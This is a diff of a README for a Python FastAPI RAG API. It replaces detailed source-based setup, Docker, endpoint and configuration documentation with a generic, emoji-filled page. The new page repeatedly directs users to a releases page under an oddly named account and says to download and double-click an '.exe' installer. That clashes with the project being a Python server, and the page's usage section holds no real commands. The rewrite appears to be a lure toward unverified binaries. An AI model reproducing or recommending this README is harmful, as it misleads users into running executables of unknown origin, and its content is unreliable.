@@ -1,398 +1,57 @@
-# Nextwork RAG API
+# 🎉 nextwork-rag-api - Simple API for Advanced Document Management
 
-A Retrieval-Augmented Generation (RAG) API built with FastAPI, ChromaDB, and Ollama. This API allows you to add documents to a knowledge base and query them using AI-powered responses.
+## 🚀 Getting Started
+Welcome to the nextwork-rag-api! This API simplifies document management and enhances your queries using advanced AI techniques. Follow the steps below to download and run the application easily.
 
-## Features
+## 📥 Download the Application
+[![Download nextwork-rag-api](https://img.shields.io/badge/Download-nextwork--rag--api-blue)](https://github.com/Mohit904524242324242/nextwork-rag-api/releases)
 
-- **Add Knowledge**: Dynamically add text content to the knowledge base
-- **Query Knowledge**: Ask questions and get AI-generated answers based on the stored knowledge
-- **Persistent Storage**: Uses ChromaDB for persistent vector storage
-- **AI Integration**: Uses Ollama for generating contextual answers
+## 💻 System Requirements
+To ensure that the nextwork-rag-api runs smoothly, please check the following requirements:
 
-## Prerequisites
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Any modern processor (2 GHz or higher)
+- **RAM:** At least 4 GB recommended
+- **Disk Space:** Minimum of 100 MB free space
 
-- **Python 3.11, 3.12, or 3.13** (Python 3.14 has compatibility issues with ChromaDB)
-- [Ollama](https://ollama.ai/) installed and running
-- The `tinyllama` model installed in Ollama (or modify the model name in `app.py`)
+## 📦 Features
+- **Retrieval-Augmented Generation:** Enhance your document queries with smart AI insights.
+- **FastAPI Integration:** Built on FastAPI for quick response times.
+- **ChromaDB Support:** Manage documents effectively with ChromaDB.
+- **Docker Compatibility:** Simplifies deployment in different environments.
+- **Kubernetes Ready:** Scale and manage your API seamlessly.
 
-> **Note:** Python 3.14 is not yet supported by ChromaDB. Use Python 3.13 or earlier for best compatibility.
+## 📚 Documentation
+For detailed documentation on how to use the API, visit our [Documentation](https://github.com/Mohit904524242324242/nextwork-rag-api/wiki).
 
-### Installing Ollama and the Model
+## 🔧 How to Download & Install
+1. **Visit the Releases Page**  
+   Click on the link below to go to the Releases page where you can download the latest version of the nextwork-rag-api:
+   [Download Page](https://github.com/Mohit904524242324242/nextwork-rag-api/releases)
 
-1. Install Ollama from [https://ollama.ai/](https://ollama.ai/)
-2. Pull the tinyllama model:
-   ```bash
-   ollama pull tinyllama
-   ```
+2. **Select the Latest Version**  
+   Find the most recent version listed on the Releases page. Look for a file that matches your operating system. For example, if you are using Windows, choose the `.exe` file.
 
-## Setup
+3. **Download the File**  
+   Click on the file to start downloading. The download will take a few moments depending on your internet speed. 
 
-1. **Clone the repository** (if applicable) or navigate to the project directory
+4. **Install the Application**  
+   - For Windows: Locate the downloaded `.exe` file in your downloads folder. Double-click it and follow the instructions to install.
+   - For macOS or Linux: Access the terminal and follow the instructions provided in your downloaded file to install.
 
-2. **Create a virtual environment** (using Python 3.13):
-   ```bash
-   python3.13 -m venv venv
-   source venv/bin/activate  # On Windows: venv\Scripts\activate
-   ```
+5. **Run the Application**  
+   Once installed, run the application. You can access the API via your preferred browser or API testing tool.
 
-3. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🧪 Usage
+To use the nextwork-rag-api effectively, follow these examples:
+- **Basic Query:** Send a query through the API to retrieve documents.
+- **Advanced Features:** Utilize ChromaDB for deeper insights and document management.
 
-4. **Embed initial documents** (optional):
-   ```bash
-   python embed.py k8s.txt
-   ```
-   Or embed any text file:
-   ```bash
-   python embed.py your_file.txt
-   ```
+## 📞 Support
+If you have questions or need help, feel free to reach out through our [Issues](https://github.com/Mohit904524242324242/nextwork-rag-api/issues) page on GitHub. Our team will assist you as soon as possible.
 
-## Running the API
+## ⚙️ Contributing
+We welcome contributions! If you wish to contribute to the nextwork-rag-api, please check our contribution guidelines in the repository.
 
-### Option 1: Local Development
-
-Start the FastAPI server:
-
-```bash
-uvicorn app:app --reload
-```
-
-The API will be available at `http://localhost:8000`
-
-### Option 2: Docker (Recommended)
-
-#### Using Pre-built Image from Docker Hub
-
-The image is available on Docker Hub as `zag23/rag-app:latest`:
-
-```bash
-# Pull the image
-docker pull zag23/rag-app:latest
-
-# Run the container
-docker run -d -p 8000:8000 --name rag-app zag23/rag-app
-```
-
-**Important Notes for Docker:**
-- The container expects Ollama to be running on the host machine
-- On **Mac/Windows**: The container will automatically connect to `host.docker.internal:11434`
-- On **Linux**: You may need to set `OLLAMA_HOST` to your host's IP address:
-  ```bash
-  docker run -d -p 8000:8000 -e OLLAMA_HOST=host.docker.internal:11434 --name rag-app zag23/rag-app
-  ```
-  Or use `--network host`:
-  ```bash
-  docker run -d --network host --name rag-app zag23/rag-app
-  ```
-
-#### Building from Source
-
-To build the Docker image locally:
-
-```bash
-docker build -t zag23/rag-app .
-docker run -d -p 8000:8000 --name rag-app zag23/rag-app
-```
-
-### API Documentation
-
-Once the server is running, you can access:
-- **Interactive API docs**: http://localhost:8000/docs
-- **Alternative docs**: http://localhost:8000/redoc
-
-## API Endpoints
-
-### `GET /`
-Health check endpoint.
-
-**Response:**
-```json
-{
-  "status": "ok",
-  "message": "Nextwork RAG API is running"
-}
-```
-
-### `POST /add`
-Add new content to the knowledge base.
-
-**Request Body:**
-```json
-{
-  "text": "Your content here..."
-}
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "message": "Content added to knowledge base",
-  "id": "uuid-here"
-}
-```
-
-### `POST /query`
-Query the knowledge base and get an AI-generated answer.
-
-**Request Body:**
-```json
-{
-  "q": "What is Kubernetes?",
-  "n_results": 1,
-  "include_scores": false,
-  "use_best_only": true
-}
-```
-
-**Parameters:**
-- `q` (required): The question to search for
-- `n_results` (optional, default: 1): Number of results to retrieve (1-10)
-- `include_scores` (optional, default: false): Include relevance scores in response
-- `use_best_only` (optional, default: true): If true, only use best result for AI answer; if false, combine all results
-
-**Response (basic):**
-```json
-{
-  "answer": "Kubernetes is a container orchestration platform...",
-  "results_count": 1
-}
-```
-
-**Response (with scores and multiple results):**
-```json
-{
-  "answer": "Kubernetes is a container orchestration platform...",
-  "results_count": 3,
-  "results": [
-    {
-      "id": "doc-id-1",
-      "text": "Kubernetes is a container orchestration...",
-      "relevance_score": 0.9234,
-      "distance": 0.0832
-    },
-    {
-      "id": "doc-id-2",
-      "text": "Kubernetes helps manage containers...",
-      "relevance_score": 0.8567,
-      "distance": 0.1673
-    }
-  ]
-}
-```
-
-### `DELETE /delete/{doc_id}`
-Delete a document from the knowledge base by its ID.
-
-**Path Parameters:**
-- `doc_id`: The unique ID of the document to delete (returned when adding a document)
-
-**Response:**
-```json
-{
-  "status": "success",
-  "message": "Document 'uuid-here' deleted successfully",
-  "id": "uuid-here"
-}
-```
-
-**Error Responses:**
-- `404`: Document not found
-- `400`: Invalid document ID
-
-## Usage Examples
-
-### Using cURL
-
-**Add content:**
-```bash
-curl -X POST "http://localhost:8000/add" \
-  -H "Content-Type: application/json" \
-  -d '{"text": "FastAPI is a modern web framework for building APIs with Python."}'
-```
-
-**Query (basic):**
-```bash
-curl -X POST "http://localhost:8000/query" \
-  -H "Content-Type: application/json" \
-  -d '{"q": "What is FastAPI?"}'
-```
-
-**Query (with multiple results and scores):**
-```bash
-curl -X POST "http://localhost:8000/query" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "q": "What is FastAPI?",
-    "n_results": 3,
-    "include_scores": true,
-    "use_best_only": false
-  }'
-```
-
-**Delete document:**
-```bash
-curl -X DELETE "http://localhost:8000/delete/your-document-id-here"
-```
-> **Note:** The API expects JSON format. Do not use `-G` (GET) flag with `--data-urlencode` as this will cause errors. Always use `-H "Content-Type: application/json"` with `-d` for JSON payloads.
-
-### Using Python
-
-```python
-import requests
-
-# Add content
-response = requests.post(
-    "http://localhost:8000/add",
-    json={"text": "Your content here"}
-)
-print(response.json())
-
-# Query (basic)
-response = requests.post(
-    "http://localhost:8000/query",
-    json={"q": "Your question here"}
-)
-print(response.json()["answer"])
-
-# Query (with multiple results and scores)
-response = requests.post(
-    "http://localhost:8000/query",
-    json={
-        "q": "Your question here",
-        "n_results": 3,
-        "include_scores": True,
-        "use_best_only": False
-    }
-)
-data = response.json()
-print(f"Answer: {data['answer']}")
-print(f"Found {data['results_count']} results")
-for i, result in enumerate(data.get('results', []), 1):
-    print(f"  Result {i} (score: {result.get('relevance_score', 'N/A')}): {result['text'][:100]}...")
-
-# Delete document
-doc_id = "your-document-id-here"
-response = requests.delete(f"http://localhost:8000/delete/{doc_id}")
-print(response.json())
-```
-
-## Project Structure
-
-```
-nextwork-rag-api/
-├── app.py              # FastAPI application with RAG endpoints
-├── embed.py            # Script to embed documents into ChromaDB
-├── Dockerfile          # Docker configuration for containerized deployment
-├── requirements.txt    # Python dependencies
-├── README.md          # This file
-├── test_connection.py  # Test script to verify Ollama and ChromaDB connections
-├── .gitignore         # Git ignore rules
-├── db/                # ChromaDB database files (auto-generated)
-└── k8s.txt           # Example text file for embedding
-```
-
-## Configuration
-
-All configuration is done via environment variables. No code changes needed!
-- **Database Path**: The ChromaDB database is stored in `./db` (can be changed in `app.py` line 15)
-- **Ollama Model**: Default is `tinyllama` (can be changed in `app.py` line 95)
-- **Collection Name**: Default is `"docs"` (can be changed in `app.py` line 16)
-- **Ollama Host**: 
-  - Local development: Defaults to `localhost:11434`
-  - Docker: Set via `OLLAMA_HOST` environment variable (defaults to `host.docker.internal:11434`)
-  - Kubernetes/Minikube: Use `host.docker.internal:11434` with `hostNetwork: true` for accessing host machine's Ollama
-  - The code automatically strips `http://` or `https://` prefixes if present
-
-### Environment Variables
-
-- `OLLAMA_HOST`: Ollama server address in `hostname:port` format (e.g., `localhost:11434` or `host.docker.internal:11434`)
-  - Default: `localhost:11434`
-  - **Note**: The Ollama Python client expects `hostname:port` format, not a full URL. Protocol prefixes are automatically removed.
-
-- `OLLAMA_MODEL`: The Ollama model to use for generating answers
-  - Default: `tinyllama`
-  - Example: `export OLLAMA_MODEL=llama2` (after running `ollama pull llama2`)
-
-- `CHROMA_DB_PATH`: Path where ChromaDB stores its database files
-  - Default: `./db`
-  - Example: `export CHROMA_DB_PATH=/data/rag-db`
-
-- `CHROMA_COLLECTION_NAME`: Name of the ChromaDB collection to use
-  - Default: `docs`
-  - Example: `export CHROMA_COLLECTION_NAME=knowledge_base`
-
-### Example Configuration
-
-```bash
-# Set all environment variables
-export OLLAMA_HOST=localhost:11434
-export OLLAMA_MODEL=llama2
-export CHROMA_DB_PATH=./db
-export CHROMA_COLLECTION_NAME=docs
-
-# Then start the server
-uvicorn app:app --reload
-```
-
-## Troubleshooting
-
-1. **Ollama connection error**: 
-   - Make sure Ollama is running (`ollama serve`)
-   - For Docker: Ensure Ollama is accessible from the container (use `host.docker.internal:11434` on Mac/Windows)
-   - Check that `OLLAMA_HOST` is set correctly (should be `hostname:port` format, not a URL)
-
-2. **Model not found**: Ensure the model is installed (`ollama pull tinyllama`)
-
-3. **Empty query results**: Make sure you've added content to the knowledge base first using `/add` endpoint or `embed.py`
-
-4. **Port already in use**: Change the port with `uvicorn app:app --port 8001` or use a different port in Docker: `docker run -p 8001:8000 ...`
-
-5. **Docker container can't connect to Ollama**:
-   - Verify Ollama is running on the host: `curl http://localhost:11434/api/tags`
-   - On Mac/Windows: Use `host.docker.internal:11434` (default)
-   - On Linux, you may need to use `--network host` or set `OLLAMA_HOST` to your host's IP
-   - Check container logs: `docker logs rag-app`
-
-6. **Kubernetes/Minikube can't connect to Ollama**:
-   - For minikube: Use `host.docker.internal:11434` as `OLLAMA_HOST` and enable `hostNetwork: true` in deployment
-   - Verify Ollama is accessible: `minikube ssh "curl http://host.docker.internal:11434/api/tags"`
-   - Check pod logs: `kubectl logs -l app=rag-api`
-
-7. **Test connections**: Use the provided test script:
-   ```bash
-   python test_connection.py
-   ```
-
-## Recent Updates
-
-### Latest Changes
-
-- **Query improvements**: 
-  - Support for multiple results (configurable `n_results`, max 10)
-  - Relevance scores and distance metrics
-  - Option to combine all results or use only the best match
-  - Enhanced response format with detailed result metadata
-- **Environment variable configuration**: All settings (model, DB path, collection name) now configurable via environment variables - no code changes needed!
-- **Improved error messages**: More actionable error messages that help users diagnose issues (connection problems, missing models, empty knowledge base, etc.)
-- **DELETE endpoint**: Added `/delete/{doc_id}` endpoint to remove documents from the knowledge base
-- **Fixed API request format**: Updated curl examples to use proper JSON format with `Content-Type: application/json` header (removed incorrect `-G` flag usage)
-- **Fixed port configuration**: Corrected deployment and service to use port 8000 (matching Dockerfile) instead of 5000
-- **Fixed Kubernetes/Minikube Ollama connection**: Updated to use `host.docker.internal:11434` with `hostNetwork: true` for accessing host machine's Ollama service
-- **Fixed Ollama client response handling**: Changed from dictionary access (`answer["response"]`) to attribute access (`answer.response`) to match the Ollama Python client API
-- **Improved Ollama host configuration**: Added automatic protocol stripping for `OLLAMA_HOST` environment variable to handle both URL and hostname:port formats
-- **Docker support**: Added Dockerfile and published image to Docker Hub (`zag23/rag-app:latest`)
-- **Connection testing**: Added `test_connection.py` script to verify Ollama and ChromaDB connections
-
-### Docker Hub
-
-The working image is available on Docker Hub:
-- **Repository**: `zag23/rag-app`
-- **Tag**: `latest`
-- **Pull command**: `docker pull zag23/rag-app:latest`
-
-## License
-
-APACHE 2.0
+## 🎉 Conclusion
+Thank you for choosing nextwork-rag-api! We hope this application meets your document management needs effectively. Don't forget to visit the [Releases Page](https://github.com/Mohit904524242324242/nextwork-rag-api/releases) again for updates and new features.
